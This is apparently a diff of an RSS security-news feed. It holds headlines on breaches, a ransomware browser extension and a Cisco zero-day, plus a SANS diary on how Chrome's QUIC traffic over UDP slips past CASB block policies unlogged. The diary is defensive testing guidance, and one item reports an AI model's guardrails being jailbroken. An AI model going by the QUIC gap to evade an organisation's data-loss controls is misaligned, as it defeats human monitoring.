+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/33104</guid></item><item><title>Google releases new privacy controls for activity history, personalization</title><link>https://www.bleepingcomputer.com/news/google/google-releases-new-privacy-controls-for-activity-history-personalization/</link><description>Google is rolling out new privacy controls for Search services and Google Play, giving you more control over saved history and personalized recommendations. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/google/google-releases-new-privacy-controls-for-activity-history-personalization/</guid><category>Google</category><category>Software</category></item><item><title>DraftKings hacker 'Snoopy' sentenced to 18 months in prison</title><link>https://www.bleepingcomputer.com/news/security/draftkings-hacker-snoopy-sentenced-to-18-months-in-prison/</link><description>A 21-year-old using the alias "Snoopy" was sentenced to 18 months in prison for his role in hacking DraftKings accounts in the November 2022 cyberattack. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/draftkings-hacker-snoopy-sentenced-to-18-months-in-prison/</guid><category>Security</category><category>Legal</category></item><item><title>Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</title><link>https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/</link><description>New details have been revealed on how hackers exploited a Cisco Catalyst SD-WAN vulnerability tracked as CVE-2026-20245 in zero-day attacks to create rogue root accounts on targeted devices. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/</guid><category>Security</category></item><item><title>Malicious Edge extension abuses Native Messaging as bridge to malware</title><link>https://www.bleepingcomputer.com/news/security/malicious-edge-extension-abuses-native-messaging-as-bridge-to-malware/</link><description>A malicious Microsoft Edge extension dubbed 'Edgecution' has been used in a ransomware attack to escape the browser sandbox and deploy a Python-based backdoor. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/malicious-edge-extension-abuses-native-messaging-as-bridge-to-malware/</guid><category>Security</category></item><item><title>Zoom, Salesforce, Dialpad, and Others Bet Big on Agentic AI for CX</title><link>https://www.techrepublic.com/article/news-agentic-ai-cx-contact-center-ccw/</link><description>&lt;p&gt;CCW showed agentic AI moving deeper into CX platforms. Here’s what IT leaders should know about governance, data, workforce planning, and rollout.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-agentic-ai-cx-contact-center-ccw/"&gt;Zoom, Salesforce, Dialpad, and Others Bet Big on Agentic AI for CX&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/article/news-agentic-ai-cx-contact-center-ccw/</guid><category>Artificial Intelligence</category><category>Chatbots</category><category>Enterprise Technology</category><category>Information Technology</category><category>News</category><category>Software</category><category>Tech Industry</category><category>agentic ai</category><category>ccw</category><category>contact center</category><category>customer experience</category><category>dialpad</category><category>ringcentral</category><category>salesforce</category><category>zoom</category></item><item><title>Healthcare Vendor Xsolis Reports Breach Affecting 1.4M People</title><link>https://www.techrepublic.com/article/news-xsolis-healthcare-data-breach/</link><description>&lt;p&gt;Xsolis confirmed a healthcare data breach affecting nearly 1.4 million people after a phishing attack exposed health and identity data.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-xsolis-healthcare-data-breach/"&gt;Healthcare Vendor Xsolis Reports Breach Affecting 1.4M People&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4363402</guid><category>Cybersecurity</category><category>Data Management</category><category>News</category><category>Security</category><category>cybersecurity</category><category>health data</category><category>healthcare data breach</category><category>hhs</category><category>mayo clinic</category><category>phishing attack</category><category>uw medicine</category><category>xsolis</category></item><item><title>Apple’s £3B iCloud Lawsuit Could Affect 40M UK Users</title><link>https://www.techrepublic.com/article/news-emea-uk-apple-icloud-lawsuit-2028-trial/</link><description>&lt;p&gt;Apple lost a bid to narrow a UK iCloud lawsuit from Which?, keeping a £3 billion competition claim on track for an October 2028 trial.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-emea-uk-apple-icloud-lawsuit-2028-trial/"&gt;Apple’s £3B iCloud Lawsuit Could Affect 40M UK Users&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/article/news-emea-uk-apple-icloud-lawsuit-2028-trial/</guid><category>Apple</category><category>Cybersecurity</category><category>EMEA</category><category>EU</category><category>International</category><category>News</category><category>Security</category><category>Tech Industry</category><category>antitrust</category><category>cloud storage</category><category>competition law</category><category>consumer rights</category><category>icloud</category><category>uk</category><category>which</category></item><item><title>CNAPP evolution: How Microsoft aligns with leading cloud risk management platforms</title><link>https://www.microsoft.com/en-us/security/blog/2026/06/24/cnapp-evolution-how-microsoft-aligns-with-leading-cloud-risk-management-platforms/</link><description>&lt;p&gt;Learn how CNAPP platforms are helping organizations prioritize exploitable risks, reduce exposure, and operationalize security across the application lifecycle.&lt;/p&gt;
@@ -2023,7 +2233,7 @@ persist_enable
 
 
 
-&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Should I upgrade Windows 10 systems directly to 24H2?&lt;/strong&gt;&lt;br /&gt;Yes. Direct upgrades are supported and recommended to avoid unnecessary intermediate steps.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=40532</guid><category>Product and Tech</category><category>Patch Deployment</category><category>TruRisk Eliminate</category><category>Windows Upgrades</category><category>windows11</category></item><item><title>The Exploit Doesn't Exist. You Can Still Prove It Works Against You</title><link>https://www.bleepingcomputer.com/news/security/the-exploit-doesnt-exist-you-can-still-prove-it-works-against-you/</link><description>Attackers can now weaponize newly disclosed vulnerabilities far faster than most organizations can patch them. Picus Security explains how security teams can validate exploitability before a public exploit even exists. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/the-exploit-doesnt-exist-you-can-still-prove-it-works-against-you/</guid><category>Security</category></item><item><title>LastPass confirms data breach in Klue supply chain attack</title><link>https://www.bleepingcomputer.com/news/security/lastpass-confirms-data-breach-in-klue-supply-chain-attack/</link><description>LastPass announced that hackers accessed customer data from its Salesforce environment after stealing the company's OAuth tokens in the Klue supply chain attack earlier this month. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/lastpass-confirms-data-breach-in-klue-supply-chain-attack/</guid><category>Security</category></item><item><title>OTC Glucose Monitors Make Wellness Tracking More Personal — and More Complicated</title><link>https://www.techrepublic.com/article/news-otc-glucose-monitors-wearable-tech/</link><description>&lt;p&gt;Over-the-counter CGMs are making glucose data easier to access, but not every user benefits equally. Here’s where the evidence is strongest — and what to know about app privacy.&lt;/p&gt;
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Should I upgrade Windows 10 systems directly to 24H2?&lt;/strong&gt;&lt;br /&gt;Yes. Direct upgrades are supported and recommended to avoid unnecessary intermediate steps.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=40532</guid><category>Product and Tech</category><category>Patch Deployment</category><category>TruRisk Eliminate</category><category>Windows Upgrades</category><category>windows11</category></item><item><title>The Exploit Doesn't Exist. You Can Still Prove It Works Against You</title><link>https://www.bleepingcomputer.com/news/security/the-exploit-doesnt-exist-you-can-still-prove-it-works-against-you/</link><description>Attackers can now weaponize newly disclosed vulnerabilities far faster than most organizations can patch them. Picus Security explains how security teams can validate exploitability before a public exploit even exists. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/the-exploit-doesnt-exist-you-can-still-prove-it-works-against-you/</guid><category>Security</category></item><item><title>OTC Glucose Monitors Make Wellness Tracking More Personal — and More Complicated</title><link>https://www.techrepublic.com/article/news-otc-glucose-monitors-wearable-tech/</link><description>&lt;p&gt;Over-the-counter CGMs are making glucose data easier to access, but not every user benefits equally. Here’s where the evidence is strongest — and what to know about app privacy.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-otc-glucose-monitors-wearable-tech/"&gt;OTC Glucose Monitors Make Wellness Tracking More Personal — and More Complicated&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4363078</guid><category>Artificial Intelligence</category><category>Digital Health and Wellness</category><category>News</category><category>Privacy</category><category>Security</category><category>Tech Trends</category><category>Wearable Tech</category><category>abbott lingo</category><category>cgms</category><category>continuous glucose monitors</category><category>Dexcom Stelo</category><category>diabetes technology</category><category>editors picks</category><category>FDA</category><category>ftc</category><category>glucose tracking</category><category>health apps</category><category>health data privacy</category><category>hipaa</category><category>OTC glucose monitors</category><category>prediabetes</category><category>smartwatches</category><category>wearable health tech</category></item><item><title>Anthropic’s Fable 5 Model Jailbroken Within Days</title><link>https://www.schneier.com/blog/archives/2026/06/anthropics-fable-5-model-jailbroken-within-days.html</link><description>&lt;p&gt;Fable 5 is the supposed safe version of Anthropic&amp;#8217;s Mythos Preview, with guardrails to ensure that it can&amp;#8217;t be used to create cyberattacks.&lt;/p&gt;
 &lt;p&gt;Well, that restriction was &lt;a href="https://cybersecuritynews.com/anthropics-claude-fable-5-jailbroken/"&gt;bypassed&lt;/a&gt; within days.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Fable 5 is the supposed safe version of Anthropic&amp;#8217;s Mythos Preview, with guardrails to ensure that it can&amp;#8217;t be used to create cyberattacks.&lt;/p&gt;
 &lt;p&gt;Well, that restriction was &lt;a href="https://cybersecuritynews.com/anthropics-claude-fable-5-jailbroken/"&gt;bypassed&lt;/a&gt; within days.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=72219</guid><category>Uncategorized</category><category>AI</category><category>cyberattack</category></item><item><title>1-15 June 2026 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2026/06/23/1-15-june-2026-cyber-attacks-timeline/</link><description>The cyber attacks timeline for 1-15 June 2026 is out with 80 confirmed events dominated by cyber crime, malware, and exploitation of public-facing applications. Information &amp;#038; Communication led the most targeted sectors, while supply chain was under fire.</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=45901</guid><category>Security</category><category>2026</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>H1</category><category>June</category><category>Malware</category><category>Timeline</category><category>Vulnerabilities</category></item><item><title>CVE-2024-40766: The Patch Fixed the Bug. Nobody Fixed the Configuration., (Tue, Jun 23rd)</title><link>https://isc.sans.edu/diary/rss/33094</link><description>&lt;h1&gt;&lt;u&gt;&lt;strong&gt;The vulnerability&lt;/strong&gt;&lt;/u&gt;&lt;/h1&gt;&amp;#xd;</description><content:encoded>&lt;h1&gt;&lt;u&gt;&lt;strong&gt;The vulnerability&lt;/strong&gt;&lt;/u&gt;&lt;/h1&gt;
@@ -6123,225 +6333,7 @@ DeviceProcessEvents
 
 &lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;&lt;em&gt;Forrester does not endorse any company, product, brand, or service included in its research publications and does not advise any person to select the products or services of any company or brand based on the ratings included in such publications. Information is based on the best available resources. Opinions reflect judgment at the time and are subject to change. This report is part of a broader collection of Forrester resources, including interactive models, frameworks, tools, data, and access to analyst guidance. For more information, read about Forrester’s objectivity &lt;/em&gt;&lt;/strong&gt;&lt;a href="https://www.forrester.com/about-us/objectivity/" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;&lt;em&gt;here &lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;  &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2026/06/17/forrester-names-microsoft-a-leader-in-the-2026-extended-detection-and-response-platforms-wave-report/"&gt;​​Forrester names Microsoft a Leader in the 2026 Extended Detection and Response Platforms Wave™ report&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.microsoft.com/en-us/security/blog/?p=148048</guid><category>Forrester Waves</category></item><item><title>Ozempic Maker Novo Nordisk Confirms Security Incident After $25M Hacker Demand</title><link>https://www.techrepublic.com/article/news-novo-nordisk-1-3tb-theft-25m-demand-emea/</link><description>&lt;p&gt;Hackers claim they stole 1.3TB of Novo Nordisk data, including clinical trial and AI model information, after issuing a $25 million demand.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-novo-nordisk-1-3tb-theft-25m-demand-emea/"&gt;Ozempic Maker Novo Nordisk Confirms Security Incident After $25M Hacker Demand&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4362687</guid><category>Artificial Intelligence</category><category>Cybersecurity</category><category>Data Breaches</category><category>EMEA</category><category>EU</category><category>International</category><category>News</category><category>Security</category><category>ai models</category><category>clinical trial data</category><category>cybersecurity</category><category>data breach</category><category>editors picks</category><category>emea</category><category>extortion</category><category>fulcrumsec</category><category>healthcare security</category><category>novo nordisk</category><category>pharmaceutical data</category><category>ransomware</category></item><item><title>The browser blind spot: Why your security tool may not be blocking what you think it is &amp;#x5b;Guest Diary&amp;#x5d;, (Wed, Jun 17th)</title><link>https://isc.sans.edu/diary/rss/33084</link><description>&lt;p&gt;&amp;#x5b;This is a guest diary submitted by Varun Murdula&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a guest diary submitted by Varun Murdula]&lt;/p&gt;
-
-&lt;h3&gt;SUMMARY&lt;/h3&gt;
-
-&lt;p&gt;CASB block policies rely on inspecting TCP traffic. QUIC, the protocol powering HTTP/3, runs over UDP, a protocol most CASBs cannot inspect. The result: Chrome can reach a destination your CASB is supposed to block, and nothing in the logs shows it happened. This article explains the gap, how to test for it, and what to do about it.&lt;br /&gt;
-When a security team blocks access to a website or cloud service, the assumption is simple: the block is in place, so users cannot reach that destination. The rule is configured. The tool is running.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;quot;Job done. Time for coffee.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;That assumption is often wrong. When it is, there is nothing in the logs to tell you.&lt;/p&gt;
-
-&lt;p&gt;I ran a test across five browsers on a managed endpoint with an active CASB policy. What I found is what this article describes. There is a real enforcement gap in how CASBs handle browser traffic. It is documented by the security vendors themselves, including published guidance from Palo Alto Networks, Forcepoint, and Cloudflare. But many security teams have never tested for it and do not know it applies to them. The tools are doing what they were designed to do. The way CASBs were built predates how browsers behave today. A block policy can look completely fine in every log and dashboard while traffic to the blocked destination flows freely through a different browser on the same machine.&lt;/p&gt;
-
-&lt;h3&gt;First, what is a CASB?&lt;/h3&gt;
-
-&lt;p&gt;A Cloud Access Security Broker (CASB, pronounced &amp;ldquo;cazz-bee&amp;rdquo;) is a security tool that sits between an organization&amp;rsquo;s users and the internet. Gartner, which coined the term in 2012, defines it as &amp;ldquo;on-premises, or cloud-based security policy enforcement points, placed between cloud service consumers and cloud service providers to combine and interject enterprise security policies as the cloud-based resources are accessed.&amp;rdquo;10 In plain terms: it sits in the path of every internet connection and decides what gets through.&lt;/p&gt;
-
-&lt;p&gt;Proxy mode is the most common deployment for web traffic inspection. In this mode, every time a browser connects to a website or service, the CASB intercepts the request, checks it against policy rules, and either allows it or blocks it. It acts like a security checkpoint on every outbound internet connection.&lt;/p&gt;
-
-&lt;p&gt;CASBs are used to stop employees from sending sensitive data to places their organization does not permit: personal cloud storage, unauthorized file sharing tools, and generative AI chatbots where organizational policies may prohibit data sharing.&lt;/p&gt;
-
-&lt;p&gt;To inspect web traffic, a CASB needs to read the content of the connection, including encrypted ones. The vast majority of web traffic today is encrypted using Transport Layer Security (TLS). A protocol is a set of rules for how data travels across a network. TLS encrypts data in transit so only the sender and recipient can read it. It is the technology behind the padlock icon in your browser&amp;rsquo;s address bar.&lt;/p&gt;
-
-&lt;p&gt;To inspect TLS-encrypted traffic, a CASB performs SSL/TLS inspection (SSL stands for Secure Sockets Layer, TLS&amp;rsquo;s older predecessor). The CASB intercepts the connection and decrypts it. It then inspects the content, applies its policy, re-encrypts the traffic, and forwards it on. From the user&amp;rsquo;s side, nothing looks different. The padlock is still in the address bar.&lt;br /&gt;
-For this to work, the CASB needs the browser to trust its re-signed certificates. It does that by installing a root Certificate Authority (CA) certificate into the device&amp;rsquo;s trusted certificate store, a list of credentials the device recognizes as legitimate. Once that certificate is there, the browser trusts the CASB&amp;rsquo;s re-signed traffic and continues normally.&lt;/p&gt;
-
-&lt;p&gt;This works fine, but not every browser on the device handles that certificate the same way.&lt;/p&gt;
-
-&lt;h3&gt;How QUIC creates a gap in your CASB coverage&lt;/h3&gt;
-
-&lt;p&gt;Two things explain this gap.&lt;/p&gt;
-
-&lt;p&gt;The first is QUIC, a modern transport protocol developed by Google and standardized by the IETF.1 It was designed to make web connections faster and more reliable. It was not designed to circumvent enterprise security controls. This gap exists because proxy-based inspection tools were built around TCP, not because QUIC has a flaw. The name is not an acronym. Google just called it QUIC.&lt;/p&gt;
-
-&lt;p&gt;The second is the difference between TCP and UDP, the two transport mechanisms that determine whether your CASB ever sees the traffic.&lt;/p&gt;
-
-&lt;p&gt;TCP (Transmission Control Protocol) is the traditional protocol behind most internet traffic. Ordered, reliable, and what CASB SSL/TLS inspection is built around.&lt;/p&gt;
-
-&lt;p&gt;UDP (User Datagram Protocol) is a faster, lower-overhead alternative. It trades some of TCP&amp;rsquo;s reliability for speed and does not require the same connection handshake.&lt;/p&gt;
-
-&lt;p&gt;QUIC runs over UDP, not TCP. CASB inspection only works on TCP, so it never sees QUIC traffic.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;quot;Chrome took the side door. The CASB was watching the front.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;QUIC is the transport behind HTTP/3 (the third version of the Hypertext Transfer Protocol, the language of the web). Chrome learns which servers support QUIC through previous connections, Alt-Svc headers, or DNS HTTPS records (RFC 9460), which let servers signal QUIC support before a connection even starts.9 Once Chrome knows a server supports QUIC, it tries it automatically. When that happens, the traffic goes over UDP. The CASB only monitors TCP, so it never sees the connection. No block fires and nothing is logged.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;KEY FINDING: &amp;nbsp;A user on a managed laptop can reach a destination the CASB is supposed to block, simply because Chrome used QUIC over UDP instead of TCP. The tool is running. The policy is active. The block does not fire.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;These are not hypothetical concerns. Palo Alto Networks explicitly recommends blocking QUIC in their internet gateway security best practices.2 Forcepoint published a dedicated advisory documenting that QUIC traffic from Chrome, Edge, Brave, Firefox, and Safari may not be intercepted by their proxy.3 Cloudflare&amp;rsquo;s gateway documentation states directly: if the UDP proxy or TLS decryption is off, HTTP/3 traffic from Chrome bypasses inspection entirely. [4]&lt;/p&gt;
-
-&lt;h3&gt;The broader problem: Browsers do not all behave the same way&lt;/h3&gt;
-
-&lt;p&gt;QUIC is the clearest example, but it is not the only way enforcement can fail across browsers.&lt;/p&gt;
-
-&lt;p&gt;When a CASB policy is set up and tested, it is usually tested once, from a single browser, and signed off as working. Most teams never verify whether the policy is enforced consistently across every browser on managed devices.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;quot;One browser tested. Zero browsers questioned. Ticket closed.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Keep Aware&amp;rsquo;s 2026 Browser Security Report makes the point clearly: DLP and CASB tools were built for a different era of computing, one defined by email attachments, file transfers, and endpoint storage.5 They were never designed for what people actually do in a browser today: typing sensitive data into a web form, pasting content into an AI chatbot, uploading files through a browser interface.&lt;/p&gt;
-
-&lt;p&gt;Some DLP tools enforce policy through a browser extension rather than a network proxy. That extension only works in browsers where it was deployed.6 Use a different browser on the same machine and the enforcement is gone entirely.&lt;/p&gt;
-
-&lt;h3&gt;Why this is invisible in standard log review&lt;/h3&gt;
-
-&lt;p&gt;That missing coverage does not generate an alert. It leaves no trace.&lt;/p&gt;
-
-&lt;p&gt;When QUIC bypasses the proxy, the traffic never touches the inspection pipeline. The CASB sees nothing. No failed block, no error, no anomaly. When one browser is enforced and another is not, the CASB log looks clean. Block events from the enforced browser are there. The uninspected traffic from the other browser generates no entries at all.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;quot;The logs are not lying. They reported exactly what they saw. The problem is they only saw the traffic that came through TCP.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;CASB block event counts get used to assess how much traffic reached a blocked destination. But block events only count traffic that entered the inspection pipeline, not all traffic that actually arrived. Where QUIC is unblocked, the real number is higher. Sometimes significantly. In an investigation, that gap means you underestimated how much data actually moved &amp;mdash; you scoped the incident wrong.&lt;/p&gt;
-
-&lt;h3&gt;Why this gap matters now&lt;/h3&gt;
-
-&lt;p&gt;Generative AI has changed where sensitive data goes. Industry research consistently shows that employees are sharing internal documents, reports, and confidential data with AI tools at significant scale.[7] Most of it on managed devices, through Chromium-based browsers, reaching destinations that CASB policies are meant to block.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;223 &amp;nbsp;avg GenAI policy violations per org per month (Netskope 2026)&lt;br /&gt;
-2x &amp;nbsp;sensitive data incidents sent to AI platforms, year over year (Netskope 2026)&lt;br /&gt;
-86% &amp;nbsp;security leaders who believe employees are sharing sensitive data with AI tools without authorization (Code42 2024)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Blocking AI destinations at the CASB layer is the right call. But if QUIC is unblocked and HTTP/3 connections are being established over UDP to those destinations, the block may not be firing for a significant portion of actual traffic. The policy says blocked. The network says otherwise.&lt;/p&gt;
-
-&lt;p&gt;For organizations subject to GDPR, HIPAA, PCI DSS, or SOC 2, an undetected enforcement gap like this one is not just a security problem. It is a compliance risk. Regulators do not distinguish between a policy that was misconfigured and one that was never enforced &amp;mdash; the outcome is the same.&lt;/p&gt;
-
-&lt;h3&gt;How to test whether this gap exists in your environment&lt;/h3&gt;
-
-&lt;p&gt;Run this on a test device configured the same as production. You need three things. First, the CASB agent active with a block policy targeting a specific URL. Second, all five browsers installed on that device: Safari, Chrome, Brave, Firefox, and Edge. Third, access to your CASB&amp;rsquo;s log console. URL stands for Uniform Resource Locator, which is just a web address.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;quot;Takes about twenty minutes. Less time than the average security vendor webinar.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ol&gt;
-	&lt;li&gt;Confirm the CASB agent is running and the block policy is active on the test device.&lt;/li&gt;
-	&lt;li&gt;Open Safari and navigate to the blocked destination. Verify the block fires and a log event appears in the CASB console.&lt;/li&gt;
-	&lt;li&gt;Open Chrome and navigate to the same destination. Does the block fire, or does the page load?&lt;/li&gt;
-	&lt;li&gt;Repeat with Brave, Firefox, and Edge separately. Record each result.&lt;/li&gt;
-	&lt;li&gt;In Chrome, type chrome://net-export into the address bar. That is Chrome&amp;rsquo;s built-in network log. Use it to check whether Chrome negotiated a QUIC connection to the destination.&lt;/li&gt;
-	&lt;li&gt;At the firewall or proxy, check whether UDP port 443 is being explicitly dropped. If it is allowed through, QUIC bypass is possible.&lt;/li&gt;
-	&lt;li&gt;Compare CASB log entries against what you observed in each browser.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;What to look for if the gap exists:&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-
-&lt;table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; font-family: Arial, sans-serif;"&gt;
-	&lt;thead&gt;
-		&lt;tr style="background-color: #f2f2f2;"&gt;
-			&lt;th style="text-align: left;"&gt;Browser&lt;/th&gt;
-			&lt;th style="text-align: left;"&gt;Engine&lt;/th&gt;
-			&lt;th style="text-align: left;"&gt;Expected result&lt;/th&gt;
-		&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-		&lt;tr&gt;
-			&lt;td&gt;&lt;strong&gt;Safari&lt;/strong&gt;&lt;/td&gt;
-			&lt;td&gt;WebKit&lt;/td&gt;
-			&lt;td&gt;Block fires. Log event generated.&lt;/td&gt;
-		&lt;/tr&gt;
-		&lt;tr&gt;
-			&lt;td&gt;&lt;strong&gt;Chrome&lt;/strong&gt;&lt;/td&gt;
-			&lt;td&gt;Chromium / Blink&lt;/td&gt;
-			&lt;td&gt;Page loads. No block. No log entry.&lt;/td&gt;
-		&lt;/tr&gt;
-		&lt;tr&gt;
-			&lt;td&gt;&lt;strong&gt;Brave&lt;/strong&gt;&lt;/td&gt;
-			&lt;td&gt;Chromium / Blink&lt;/td&gt;
-			&lt;td&gt;Page loads. No block. No log entry.&lt;/td&gt;
-		&lt;/tr&gt;
-		&lt;tr&gt;
-			&lt;td&gt;&lt;strong&gt;Firefox&lt;/strong&gt;&lt;/td&gt;
-			&lt;td&gt;Gecko&lt;/td&gt;
-			&lt;td&gt;Varies by proxy vendor. Test independently.&lt;/td&gt;
-		&lt;/tr&gt;
-		&lt;tr&gt;
-			&lt;td&gt;&lt;strong&gt;Edge&lt;/strong&gt;&lt;/td&gt;
-			&lt;td&gt;Chromium / Blink&lt;/td&gt;
-			&lt;td&gt;Chromium-based. Behavior similar to Chrome.&lt;/td&gt;
-		&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p style="margin-left: 40px;"&gt;NOTE ON FIREFOX &amp;nbsp;Cloudflare&amp;rsquo;s documentation shows Firefox HTTP/3 inspection can work when the UDP proxy is properly enabled. Behavior varies by CASB vendor. Do not assume Firefox is safe or vulnerable. Test it in your specific environment.&lt;/p&gt;
-
-&lt;p&gt;What to do about it&lt;/p&gt;
-
-&lt;p&gt;01 &amp;nbsp;Block QUIC at the network layer&lt;/p&gt;
-
-&lt;p&gt;Ask your network team to drop UDP/443 traffic at the proxy, Secure Web Gateway (SWG), or firewall. Chromium-based browsers fall back to TCP when QUIC is blocked, and the CASB inspection pipeline takes over. Most platforms handle this gracefully, though some may see a brief delay on the first connection as the browser falls back to TCP. Recommended by Palo Alto Networks, Forcepoint, and Cloudflare. Verify it is actually enforced, not just documented somewhere.&lt;/p&gt;
-
-&lt;p&gt;02 &amp;nbsp;Test every browser, not just one&lt;/p&gt;
-
-&lt;p&gt;Testing a single browser and calling the control validated is not enough. Safari, Chrome, Brave, Firefox, and Edge each have different protocol behaviors. Every browser in the environment needs to be tested independently, starting at initial deployment and again after any policy changes.&lt;/p&gt;
-
-&lt;p&gt;03 &amp;nbsp;Compare CASB logs against what your endpoint actually recorded&lt;/p&gt;
-
-&lt;p&gt;Endpoint telemetry shows what programs are running and what connections they are making. A pattern where Safari generates block events for a destination while Chrome generates none on the same device in the same time window is worth investigating. It means the block is not reaching Chrome, not that the user was inactive.&lt;/p&gt;
-
-&lt;p&gt;04 &amp;nbsp;Look at controls that live inside the browser, not outside it&lt;/p&gt;
-
-&lt;p&gt;Proxy-based enforcement intercepts traffic from the outside. It was designed before QUIC existed and before users spent most of their working day inside a browser. There are tools that work differently: browser-native DLP products, endpoint agents that monitor at the process level, and secure enterprise browsers such as Island or Talon that apply policy from within the browser itself. None of them replaces a CASB, but each one covers gaps that a CASB cannot.&lt;/p&gt;
-
-&lt;p&gt;05 &amp;nbsp;Treat CASB event counts as a floor, not a ceiling&lt;/p&gt;
-
-&lt;p&gt;In any investigation or data loss review, CASB block event volume is the minimum known traffic, the fraction that entered the inspection pipeline. Actual traffic may be higher. Cross-check against your endpoint logs before you call the scope final.&lt;/p&gt;
-
-&lt;p&gt;Conclusion&lt;/p&gt;
-
-&lt;p&gt;Nobody wants to find out their block policy was not working by reviewing an incident report. But that is exactly how this gap tends to surface. The logs looked fine. The dashboard was clean. The policy was active. Meanwhile, QUIC connections were going straight to the destination that was supposed to be blocked.&lt;br /&gt;
-This is not a cutting-edge attack technique. It is a protocol mismatch that has been sitting in enterprise environments for years. Nobody talks about it because the logs never show anything wrong. No alert. No error. Just traffic moving where it should not be, with no corresponding log entry to show for it.&lt;br /&gt;
-If you take one thing from this: ask your network team to block UDP port 443 at the firewall or proxy, then test every browser in your environment against a blocked destination. Twenty minutes. You might be surprised what you find.&lt;br /&gt;
-If you are sharing this with leadership: ask your security team to run the test in the section above and report back. The answer will tell you whether your current enforcement is doing what you think it is.&lt;/p&gt;
-
-&lt;p&gt;Assume nothing. Test everything.&lt;/p&gt;
-
-&lt;p&gt;Glossary of key terms&lt;br /&gt;
-CASB &amp;nbsp;Cloud Access Security Broker. A security tool that monitors and controls traffic between users and cloud services. In proxy mode, it acts as a checkpoint on every outbound internet connection.&lt;br /&gt;
-SSL / TLS &amp;nbsp;Secure Sockets Layer / Transport Layer Security. Encryption protocols that protect data in transit. The padlock in your browser&amp;rsquo;s address bar means TLS is active.&lt;br /&gt;
-CA &amp;nbsp;Certificate Authority. Issues digital credentials called certificates. In the context of this article, a CASB uses a CA certificate so browsers trust its re-signed traffic during SSL inspection.&lt;br /&gt;
-TCP &amp;nbsp;Transmission Control Protocol. The traditional, reliable internet transport protocol. CASB inspection tools are built to intercept TCP traffic.&lt;br /&gt;
